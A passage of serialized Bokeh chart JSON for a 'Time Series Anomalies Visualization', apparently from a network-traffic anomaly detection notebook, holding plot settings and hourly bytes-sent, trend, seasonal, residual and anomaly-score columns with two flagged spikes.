,{\"id\":\"1026\"},{\"id\":\"1027\"},{\"id\":\"1028\"}]},\"id\":\"1030\",\"type\":\"Toolbar\"},{\"attributes\":{},\"id\":\"1027\",\"type\":\"SaveTool\"},{\"attributes\":{\"format\":\"00\"},\"id\":\"1039\",\"type\":\"NumeralTickFormatter\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"1062\",\"type\":\"MonthsTicker\"},{\"attributes\":{},\"id\":\"1014\",\"type\":\"LinearScale\"},{\"attributes\":{},\"id\":\"1184\",\"type\":\"Selection\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"1186\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"overlay\":{\"id\":\"1153\"},\"x_range\":{\"id\":\"1008\"},\"y_range\":null},\"id\":\"1152\",\"type\":\"RangeTool\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"1024\",\"type\":\"WheelZoomTool\"},{\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"id\":\"1055\"},{\"id\":\"1056\"},{\"id\":\"1057\"},{\"id\":\"1058\"},{\"id\":\"1059\"},{\"id\":\"1060\"},{\"id\":\"1061\"},{\"id\":\"1062\"},{\"id\":\"1063\"},{\"id\":\"1064\"},{\"id\":\"1065\"},{\"id\":\"1066\"}]},\"id\":\"1017\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"coordinates\":null,\"group\":null,\"text\":\"Time Series Anomalies Visualization\"},\"id\":\"1006\",\"type\":\"Title\"},{\"attributes\":{\"overlay\":{\"id\":\"1029\"}},\"id\":\"1025\",\"type\":\"BoxZoomTool\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"1188\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"1192\",\"type\":\"DaysTicker\"},{\"attributes\":{\"source\":{\"id\":\"1145\"}},\"id\":\"1151\",\"type\":\"CDSView\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"1193\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"fill_color\":{\"value\":\"blue\"},\"hatch_color\":{\"value\":\"blue\"},\"line_color\":{\"value\":\"blue\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"score\"}},\"id\":\"1147\",\"type\":\"Circle\"},{\"attributes\":{},\"id\":\"1012\",\"type\":\"LinearScale\"},{\"attributes\":{},\"id\":\"1026\",\"type\":\"ResetTool\"},{\"attributes\":{},\"id\":\"1183\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"1063\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"1190\",\"type\":\"DaysTicker\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"1191\",\"type\":\"DaysTicker\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"1064\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"1037\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{\"data\":{\"TimeGenerated\":{\"__ndarray__\":\"AADAwRYyd0IAAKgwGjJ3QgAAkJ8dMndCAAB4DiEyd0IAAGB9JDJ3QgAASOwnMndCAAAwWysyd0IAABjKLjJ3QgAAADkyMndCAADopzUyd0IAANAWOTJ3QgAAuIU8MndCAACg9D8yd0IAAIhjQzJ3QgAAcNJGMndCAABYQUoyd0IAAECwTTJ3QgAAKB9RMndCAAAQjlQyd0IAAPj8VzJ3QgAA4GtbMndCAADI2l4yd0IAALBJYjJ3QgAAmLhlMndCAACAJ2kyd0IAAGiWbDJ3QgAAUAVwMndCAAA4dHMyd0IAACDjdjJ3QgAACFJ6MndCAADwwH0yd0IAANgvgTJ3QgAAwJ6EMndCAACoDYgyd0IAAJB8izJ3QgAAeOuOMndCAABgWpIyd0IAAEjJlTJ3QgAAMDiZMndCAAAYp5wyd0IAAAAWoDJ3QgAA6ISjMndCAADQ86Yyd0IAALhiqjJ3QgAAoNGtMndCAACIQLEyd0IAAHCvtDJ3QgAAWB64MndCAABAjbsyd0IAACj8vjJ3QgAAEGvCMndCAAD42cUyd0IAAOBIyTJ3QgAAyLfMMndCAACwJtAyd0IAAJiV0zJ3QgAAgATXMndCAABoc9oyd0IAAFDi3TJ3QgAAOFHhMndCAAAgwOQyd0IAAAgv6DJ3QgAA8J3rMndCAADYDO8yd0IAAMB78jJ3QgAAqOr1MndCAACQWfkyd0IAAHjI/DJ3QgAAYDcAM3dCAABIpgMzd0IAADAVBzN3QgAAGIQKM3dCAAAA8w0zd0IAAOhhETN3QgAA0NAUM3dCAAC4Pxgzd0IAAKCuGzN3QgAAiB0fM3dCAABwjCIzd0IAAFj7JTN3QgAAQGopM3dCAAAo2Swzd0IAABBIMDN3QgAA+LYzM3dCAADgJTczd0IAAMiUOjN3QgAAsAM+M3dCAACYckEzd0IAAIDhRDN3QgAAaFBIM3dCAABQv0szd0IAADguTzN3QgAAIJ1SM3dCAAAIDFYzd0IAAPB6WTN3QgAA2OlcM3dCAADAWGAzd0IAAKjHYzN3QgAAkDZnM3dCAAB4pWozd0IAAGAUbjN3QgAASINxM3dCAAAw8nQzd0IAABhheDN3QgAAANB7M3dCAADoPn8zd0IAANCtgjN3QgAAuByGM3dCAACgi4kzd0IAAIj6jDN3QgAAcGmQM3dCAABY2JMzd0IAAEBHlzN3QgAAKLaaM3dCAAAQJZ4zd0IAAPiToTN3QgAA4AKlM3dCAADIcagzd0IAALDgqzN3QgAAmE+vM3dCAACAvrIzd0IAAGgttjN3QgAAUJy5M3dCAAA4C70zd0IAACB6wDN3QgAACOnDM3dCAADwV8czd0IAANjGyjN3QgAAwDXOM3dCAACopNEzd0IAAJAT1TN3QgAAeILYM3dCAABg8dszd0IAAEhg3zN3QgAAMM/iM3dCAAAYPuYzd0IAAACt6TN3QgAA6BvtM3dCAADQivAzd0IAALj58zN3QgAAoGj3M3dCAACI1/ozd0IAAHBG/jN3QgAAWLUBNHdCAABAJAU0d0IAACiTCDR3QgAAEAIMNHdCAAD4cA80d0IAAODfEjR3QgAAyE4WNHdCAACwvRk0d0IAAJgsHTR3QgAAgJsgNHdCAABoCiQ0d0IAAFB5JzR3QgAAOOgqNHdCAAAgVy40d0IAAAjGMTR3QgAA8DQ1NHdCAADYozg0d0IAAMASPDR3QgAAqIE/NHdCAACQ8EI0d0IAAHhfRjR3QgAAYM5JNHdCAABIPU00d0IAADCsUDR3QgAAGBtUNHdC\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[168]},\"TotalBytesSent\":[10823,14821,13532,11947,11193,13257,13375,27975,31501,28775,31398,32979,32241,33539,28420,25757,30947,27803,29637,29670,11563,13465,13587,14967,12964,13858,13119,13907,12739,11227,11268,31322,26683,32982,32544,31414,28254,29893,31290,28334,26328,26448,30576,30793,10484,14995,11715,11296,10487,10789,14758,10998,10682,14572,13689,34167,27286,33955,33700,26810,30679,31533,33739,32815,26046,27499,33974,29118,12821,12836,13819,14877,14220,10053,14690,13161,14334,12806,11771,25544,27355,33777,27055,27816,32648,25686,32147,33363,28923,31547,33575,26369,14754,10415,10286,12086,11414,14915,14479,14063,13211,12485,14759,26964,31469,26214,33556,32596,25150,31064,25338,25714,26089,25673,48616,45856,11654,13127,12184,14179,13841,11097,13724,10535,10022,12570,14145,18473,19477,19080,17622,18725,17612,19733,19338,18656,17732,17801,16167,16485,11455,10545,13991,10699,12735,12639,14501,12477,11497,10081,11729,18121,17458,18104,16508,17814,16494,17588,18545,19534,16085,15276,15363,18166,13830,13350,11842,11111],\"anomalies\":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],\"baseline\":[11187,14007,13280,12238,11314,12641,12350,30664,29442,31531,32547,32060,31540,32721,30726,27678,29255,27470,28928,28791,10907,13894,12754,13436,11796,13334,13807,12503,11862,12800,12552,29979,28690,31444,31693,30566,30470,31010,30430,28406,28016,27368,31130,29511,11469,13234,12458,13336,12055,12579,14104,12723,12402,13021,13045,29441,28468,31613,31518,30080,30103,30386,30901,29854,27887,28203,34349,31499,12950,13611,13072,13965,12753,12328,14733,12960,12805,13258,13457,28209,27735,30514,30198,28394,28438,28562,29639,29520,26364,27468,35919,32037,13313,12912,13020,14080,14269,13789,16208,14404,14225,14694,15656,26848,27373,28686,28393,27900,27131,27913,28314,28378,25707,26105,32232,29906,14825,13953,14045,13866,14136,13332,15009,12709,11857,11592,12842,20300,21208,20687,20314,20820,18816,20331,19942,20270,18209,18082,22571,22484,11144,10574,10923,10288,11477,11094,12823,10765,9983,9851,12111,16511,18096,16513,16469,18378,15622,18256,17387,18026,16531,15796,17900,20157,13089,12694,13044,11487],\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167],\"residual\":[-364,813,251,-291,-121,615,1024,-2689,2058,-2756,-1149,918,700,817,-2306,-1921,1691,332,708,878,655,-429,832,1530,1167,523,-688,1403,876,-1573,-1284,1342,-2007,1537,850,847,-2216,-1117,859,-72,-1688,-920,-554,1281,-985,1760,-743,-2040,-1568,-1790,653,-1725,-1720,1550,643,4725,-1182,2341,2181,-3270,575,1146,2837,2960,-1841,-704,-375,-2381,-129,-775,746,911,1466,-2275,-43,200,1528,-452,-1686,-2665,-380,3262,-3143,-578,4209,-2876,2507,3842,2558,4078,-2344,-5668,1440,-2497,-2734,-1994,-2855,1125,-1729,-341,-1014,-2209,-897,115,4095,-2472,5162,4695,-1981,3150,-2976,-2664,381,-432,16383,15949,-3171,-826,-1861,312,-295,-2235,-1285,-2174,-1835,977,1302,-1827,-1731,-1607,-2692,-2095,-1204,-598,-604,-1614,-477,-281,-6404,-5999,310,-29,3067,410,1257,1544,1677,1711,1513,229,-382,1609,-638,1590,38,-564,871,-668,1157,1507,-446,-520,-2537,-1991,740,655,-1202,-376],\"score\":{\"__ndarray__\":\"wXsqBZ0ywr+h30T8qIXTPy3+xdGRbLc/Qy/71X1Lvb/w3KS70YSpvwZYxigsas0/H8eTFymn2D/p2TyNrWjwvwJVXrD35eg/q6FE3vLQ8L99K6a3BjDcv3UMLTlME9Y/HERoszjG0D/6Fj+Cj57TPyOaTsw+Key/nvKk3Oh6578FqiduqG/kPy+B8TWCTb8/zbJcvwX40D8A42b9ShrVP/GqUqAuXM8/foJuB+Fbxb+GZqn47/vTPy8Q3CWJeuI/vQFFTVoh3D8eZtAVwPDIP+PAwOY++tC/kuH3lj3v4D9Ux2m61w3VPxOLoBi9P+O/afdi4Wp437+P+2PZXzHgP5XF5vyWhui/nQAX21KQ4j+UX49T/WvUPxK2E29QWdQ/f6sPaR0R67+5cNSH0mjbvxtcAgEEpNQ/G1q34yT5n7+rZo3erqXkv/JKcUF5nta/mwUFvShwy78YK6A3BOfeP1BOk0IbM9i/Yce1sWxG5T/kOfGYoFDSv+PpjuVN7ei/eyjkBC0w479UqMMKKuPlv5hzWBpIQ88/paYyCtkY5b8NRHb2SAnlv42azXTJuOI/3l51fMfGzj/1E4s0lan8Pxh09oh0/dy/3brRc9JW7D/zZ0X8z2TqP6fTSm7g8PO/HAU6sSl4yz8sX+MNoJ7bPyeRNXNTL/E/oBopmb/u8T8oyd6g54Hmv0Weqf7YXdG/KKwK5pC7wr8BYVj0rxLtv3lSSBs6E6u/qfTCyNQX07+WwCW4k+TRP5ort86459U/a1UK9lSz4T+sAyWFwcjrv/1FVi6wsJS/ivfsIKV2sj9Zgl2ET3TiP/j+Kww8esa/1dgOPXWf5L/khkXEU0Pwv4U2/DTR+cK/R+/7ub7E8z9ZvNimOivzv8GdvwT3msy/DpvF04qG+T/DQBnLs4vxv0q32c+BW+4/kEWqMmNL9z8f2PRlP/ruP+r11Gqruvg/ByGzyIWf7L9O/RMPa0IBwIshncJnYuE/hYMEi7577r+SlQzmta7wv6YrMGMgXui/H9hAOwVr8b+bvIHO5RvbP1HCL01MJeW/R/9sAEIUwb+RX+mNoufYvxK71LNT++q/tYwSv0sP1r9ILrFJNWSkP7jQLlkg1fg/kJZWKO4t7r+XG81frVH/Py/sVfnkevw/tpF5yak16L/bayQQcRbzP60adZBUJ/K/buPlW8VB8L+QDGvt0AjCP4PVZdA6gcW/lDb1kSziGEBDb2xVUTkYQDSdThHOVvO/UTb59E9V1L+GU9DvJ8Dmv0QuZb5/W70/pQzk7Revvb/x7kHnQEzrvz+F4YKkft+/7giuKWOO6r+mH2O8Om/mv8+8V3GUgtc/qc0Bd75p3z9N6Gg2VFbmvydQru6FK+W/S/YH0pCp479JxFvGWG3wv2Qmp75+mOm/f6TWaWiG3b83x4VA+JPNv0BtdNKr3s2/uOZCh1q/47/LsuOWfbHHv84FNZp8Ury/QvaOGCF/A8DJKeiI+0MCwJO/cLKyKb0/P1U0v4V8jr/AbCI5RZXyPxQvF4TfccM/Bd/CE51R3j8K8VGQHKbiPyrJsQMVROQ/YjQZveit5D+TWihJn0XiP5E8RU7CSLU/3W32urcSw7+68uKQbXDjPyEaErj6hc+/R6+wEko14z8cjK/EIqaFP1Ya6Fqp7Mu/JQLxkrfu1D8prN1Ivn3Qv193U/4Z49s/EbGsZPIy4j/uWD16iC/Gv7pYZ9fZyMm/P5jnKD/47r/kVvLwyVTov5JtLu85v9E/8apSoC5czz/SiNkm9Xndv9THBykEyMK/\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[168]},\"seasonal\":[-10756,-7953,-8697,-9756,-10696,-9384,-9691,8607,7371,9446,10451,9953,9422,10593,8591,5536,7107,5316,6769,6628,-11261,-8280,-9428,-8756,-10385,-8835,-8347,-9634,-10254,-9288,-9505,7958,6710,9506,9796,8706,8644,9210,8648,6634,6245,5590,9335,7690,-10386,-8661,-9482,-8650,-9974,-9493,-8009,-9429,-9788,-9206,-9218,7140,6131,9240,9113,7648,7648,7913,8416,7361,5392,5710,11862,9021,-9516,-8842,-9364,-8452,-9641,-10039,-7602,-9339,-9454,-8958,-8714,6084,5661,8490,8223,6463,6546,6699,7796,7686,4528,5618,14048,10140,-8612,-9048,-8988,-7986,-7865,-8418,-6074,-7950,-8193,-7776,-6853,4315,4832,6151,5880,5424,4709,5565,6062,6248,3727,4303,10633,8532,-6302,-6906,-6524,-6391,-5789,-6245,-4208,-6142,-6629,-6534,-4936,2855,4081,3858,3764,4527,2756,4475,4259,4727,2775,2730,7286,7253,-4041,-4576,-4198,-4811,-3607,-3979,-2234,-4275,-5042,-5159,-2886,1527,3124,1555,1525,3449,709,3359,2509,3168,1695,982,3111,5395,-1643,-2008,-1625,-3149],\"trend\":[21943,21961,21977,21994,22010,22026,22042,22056,22070,22084,22096,22107,22117,22127,22135,22142,22148,22154,22158,22163,22168,22174,22182,22193,22181,22169,22155,22137,22116,22089,22058,22021,21980,21938,21897,21859,21826,21799,21781,21771,21770,21777,21795,21821,21855,21896,21941,21986,22030,22073,22114,22153,22191,22227,22264,22300,22337,22372,22404,22432,22455,22473,22485,22492,22495,22493,22487,22477,22466,22453,22437,22417,22394,22367,22335,22299,22259,22217,22172,22124,22074,22024,21975,21930,21892,21863,21843,21834,21836,21849,21870,21896,21925,21961,22008,22066,22134,22208,22283,22355,22418,22471,22509,22533,22541,22534,22512,22475,22421,22348,22252,22129,21979,21801,21598,21373,21128,20860,20570,20257,19925,19577,19217,18852,18486,18127,17778,17444,17127,16828,16549,16292,16060,15855,15682,15542,15434,15351,15285,15231,15186,15150,15121,15100,15085,15074,15058,15041,15025,15011,14997,14984,14971,14957,14943,14929,14913,14896,14877,14858,14836,14813,14788,14761,14733,14702,14670,14636],\"weights\":[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]},\"selected\":{\"id\":\"1053\"},\"selection_policy\":{\"id\":\"1052\"}},\"id\":\"1003\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"callback\":null,\"formatters\":{\"@TimeGenerated\":\"datetime\"},\"tooltips\":[[\"TimeGenerated\",\"@TimeGenerated{%F %T.%3N}\"],[\"TotalBytesSent\",\"@TotalBytesSent\"],[\"residual\",\"@residual\"],[\"trend\",\"@trend\"],[\"seasonal\",\"@seasonal\"],[\"weights\",\"@weights\"],[\"baseline\",\"@baseline\"],[\"score\",\"@score\"]]},\"id\":\"1004\",\"type\":\"HoverTool\"},{\"attributes\":{\"fill_color\":{\"value\":\"#1f77b4\"},\"line_color\":{\"value\":\"navy\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"1042\",\"type\":\"Circle\"},{\"attributes\":{\"label\":{\"value\":\"baseline\"},\"renderers\":[{\"id\":\"1073\"}]},\"id\":\"1095\",\"type\":\"LegendItem\"},{\"attributes\":{},\"id\":\"1066\",\"type\":\"YearsTicker\"},{\"attributes\":{\"coordinates\":null,\"data_source\":{\"id\":\"1003\"},\"glyph\":{\"id\":\"1070\"},\"group\":null,\"hover_glyph\":null,\"muted_glyph\":{\"id\":\"1072\"},\"nonselection_glyph\":{\"id\":\"1071\"},\"view\":{\"id\":\"1074\"}},\"id\":\"1073\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"1061\",\"type\":\"DaysTicker\"},{\"attributes\":{\"line_alpha\":0.2,\"line_color\":\"green\",\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"baseline\"}},\"id\":\"1072\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"1197\",\"type\":\"YearsTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#1f77b4\"},\"hatch_alpha\":{\"value\":0.1},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"navy\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"1043\",\"type\":\"Circle\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"1056\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.2},\"fill_color\":{\"value\":\"#1f77b4\"},\"hatch_alpha\":{\"value\":0.2},\"line_alpha\":{\"value\":0.2},\"line_color\":{\"value\":\"navy\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"TotalBytesSent\"}},\"id\":\"1044\",\"type\":\"Circle\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"1055\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"coordinates\":null,\"fill_alpha\":0.2,\"fill_color\":\"navy\",\"group\":null,\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[2,2],\"line_width\":0.5,\"syncable\":false},\"id\":\"1153\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"source\":{\"id\":\"1003\"}},\"id\":\"1074\",\"type\":\"CDSView\"},{\"attributes\":{\"data\":{\"TimeGenerated\":{\"__ndarray__\":\"AADAwRYyd0IAAKgwGjJ3QgAAkJ8dMndCAAB4DiEyd0IAAGB9JDJ3QgAASOwnMndCAAAwWysyd0IAABjKLjJ3QgAAADkyMndCAADopzUyd0IAANAWOTJ3QgAAuIU8MndCAACg9D8yd0IAAIhjQzJ3QgAAcNJGMndCAABYQUoyd0IAAECwTTJ3QgAAKB9RMndCAAAQjlQyd0IAAPj8VzJ3QgAA4GtbMndCAADI2l4yd0IAALBJYjJ3QgAAmLhlMndCAACAJ2kyd0IAAGiWbDJ3QgAAUAVwMndCAAA4dHMyd0IAACDjdjJ3QgAACFJ6MndCAADwwH0yd0IAANgvgTJ3QgAAwJ6EMndCAACoDYgyd0IAAJB8izJ3QgAAeOuOMndCAABgWpIyd0IAAEjJlTJ3QgAAMDiZMndCAAAYp5wyd0IAAAAWoDJ3QgAA6ISjMndCAADQ86Yyd0IAALhiqjJ3QgAAoNGtMndCAACIQLEyd0IAAHCvtDJ3QgAAWB64MndCAABAjbsyd0IAACj8vjJ3QgAAEGvCMndCAAD42cUyd0IAAOBIyTJ3QgAAyLfMMndCAACwJtAyd0IAAJiV0zJ3QgAAgATXMndCAABoc9oyd0IAAFDi3TJ3QgAAOFHhMndCAAAgwOQyd0IAAAgv6DJ3QgAA8J3rMndCAADYDO8yd0IAAMB78jJ3QgAAqOr1MndCAACQWfkyd0IAAHjI/DJ3QgAAYDcAM3dCAABIpgMzd0IAADAVBzN3QgAAGIQKM3dCAAAA8w0zd0IAAOhhETN3QgAA0NAUM3dCAAC4Pxgzd0IAAKCuGzN3QgAAiB0fM3dCAABwjCIzd0IAAFj7JTN3QgAAQGopM3dCAAAo2Swzd0IAABBIMDN3QgAA+LYzM3dCAADgJTczd0IAAMiUOjN3QgAAsAM+M3dCAACYckEzd0IAAIDhRDN3QgAAaFBIM3dCAABQv0szd0IAADguTzN3QgAAIJ1SM3dCAAAIDFYzd0IAAPB6WTN3QgAA2OlcM3dCAADAWGAzd0IAAKjHYzN3QgAAkDZnM3dCAAB4pWozd0IAAGAUbjN3QgAASINxM3dCAAAw8nQzd0IAABhheDN3QgAAANB7M3dCAADoPn8zd0IAANCtgjN3QgAAuByGM3dCAACgi4kzd0IAAIj6jDN3QgAAcGmQM3dCAABY2JMzd0IAAEBHlzN3QgAAKLaaM3dCAAAQJZ4zd0IAAPiToTN3QgAA4AKlM3dCAADIcagzd0IAALDgqzN3QgAAmE+vM3dCAACAvrIzd0IAAGgttjN3QgAAUJy5M3dCAAA4C70zd0IAACB6wDN3QgAACOnDM3dCAADwV8czd0IAANjGyjN3QgAAwDXOM3dCAACopNEzd0IAAJAT1TN3QgAAeILYM3dCAABg8dszd0IAAEhg3zN3QgAAMM/iM3dCAAAYPuYzd0IAAACt6TN3QgAA6BvtM3dCAADQivAzd0IAALj58zN3QgAAoGj3M3dCAACI1/ozd0IAAHBG/jN3QgAAWLUBNHdCAABAJAU0d0IAACiTCDR3QgAAEAIMNHdCAAD4cA80d0IAAODfEjR3QgAAyE4WNHdCAACwvRk0d0IAAJgsHTR3QgAAgJsgNHdCAABoCiQ0d0IAAFB5JzR3QgAAOOgqNHdCAAAgVy40d0IAAAjGMTR3QgAA8DQ1NHdCAADYozg0d0IAAMASPDR3QgAAqIE/NHdCAACQ8EI0d0IAAHhfRjR3QgAAYM5JNHdCAABIPU00d0IAADCsUDR3QgAAGBtUNHdC\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[168]},\"TotalBytesSent\":[10823,14821,13532,11947,11193,13257,13375,27975,31501,28775,31398,32979,32241,33539,28420,25757,30947,27803,29637,29670,11563,13465,13587,14967,12964,13858,13119,13907,12739,11227,11268,31322,26683,32982,32544,31414,28254,29893,31290,28334,26328,26448,30576,30793,10484,14995,11715,11296,10487,10789,14758,10998,10682,14572,13689,34167,27286,33955,33700,26810,30679,31533,33739,32815,26046,27499,33974,29118,12821,12836,13819,14877,14220,10053,14690,13161,14334,12806,11771,25544,27355,33777,27055,27816,32648,25686,32147,33363,28923,31547,33575,26369,14754,10415,10286,12086,11414,14915,14479,14063,13211,12485,14759,26964,31469,26214,33556,32596,25150,31064,25338,25714,26089,25673,48616,45856,11654,13127,12184,14179,13841,11097,13724,10535,10022,12570,14145,18473,19477,19080,17622,18725,17612,19733,19338,18656,17732,17801,16167,16485,11455,10545,13991,10699,12735,12639,14501,12477,11497,10081,11729,18121,17458,18104,16508,17814,16494,17588,18545,19534,16085,15276,15363,18166,13830,13350,11842,11111],\"anomalies\":[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0],\"baseline\":[11187,14007,13280,12238,11314,12641,12350,30664,29442,31531,32547,32060,31540,32721,30726,27678,29255,27470,28928,28791,10907,13894,12754,13436,11796,13334,13807,12503,11862,12800,12552,29979,28690,31444,31693,30566,30470,31010,30430,28406,28016,27368,31130,29511,11469,13234,12458,13336,12055,12579,14104,12723,12402,13021,13045,29441,28468,31613,31518,30080,30103,30386,30901,29854,27887,28203,34349,31499,12950,13611,13072,13965,12753,12328,14733,12960,12805,13258,13457,28209,27735,30514,30198,28394,28438,28562,29639,29520,26364,27468,35919,32037,13313,12912,13020,14080,14269,13789,16208,14404,14225,14694,15656,26848,27373,28686,28393,27900,27131,27913,28314,28378,25707,26105,32232,29906,14825,13953,14045,13866,14136,13332,15009,12709,11857,11592,12842,20300,21208,20687,20314,20820,18816,20331,19942,20270,18209,18082,22571,22484,11144,10574,10923,10288,11477,11094,12823,10765,9983,9851,12111,16511,18096,16513,16469,18378,15622,18256,17387,18026,16531,15796,17900,20157,13089,12694,13044,11487],\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167],\"residual\":[-364,813,251,-291,-121,615,1024,-2689,2058,-2756,-1149,918,700,817,-2306,-1921,1691,332,708,878,655,-429,832,1530,1167,523,-688,1403,876,-1573,-1284,1342,-2007,1537,850,847,-2216,-1117,859,-72,-1688,-920,-554,1281,-985,1760,-743,-2040,-1568,-1790,653,-1725,-1720,1550,643,4725,-1182,2341,2181,-3270,575,1146,2837,2960,-1841,-704,-375,-2381,-129,-775,746,911,1466,-2275,-43,200,1528,-452,-1686,-2665,-380,3262,-3143,-578,4209,-2876,2507,3842,2558,4078,-2344,-5668,1440,-2497,-2734,-1994,-2855,1125,-1729,-341,-1014,-2209,-897,115,4095,-2472,5162,4695,-1981,3150,-2976,-2664,381,-432,16383,15949,-3171,-826,-1861,312,-295,-2235,-1285,-2174,-1835,977,1302,-1827,-1731,-1607,-2692,-2095,-1204,-598,-604,-1614,-477,-281,-6404,-5999,310,-29,3067,410,1257,1544,1677,1711,1513,229,-382,1609,-638,1590,38,-564,871,-668,1157,1507,-446,-520,-2537,-1991,740,655,-1202,-376],\"score\":{\"__ndarray__\":\"wXsqBZ0ywr+h30T8qIXTPy3+xdGRbLc/Qy/71X1Lvb/w3KS70YSpvwZYxigsas0/H8eTFymn2D/p2TyNrWjwvwJVXrD35eg/q6FE3vLQ8L99K6a3BjDcv3UMLTlME9Y/HERoszjG0D/6Fj+Cj57TPyOaTsw+Key/nvKk3Oh6578FqiduqG/kPy+B8TWCTb8/zbJcvwX40D8A42b9ShrVP/GqUqAuXM8/foJuB+Fbxb+GZqn47/vTPy8Q3CWJeuI/vQFFTVoh3D8eZtAVwPDIP+PAwOY++tC/kuH3lj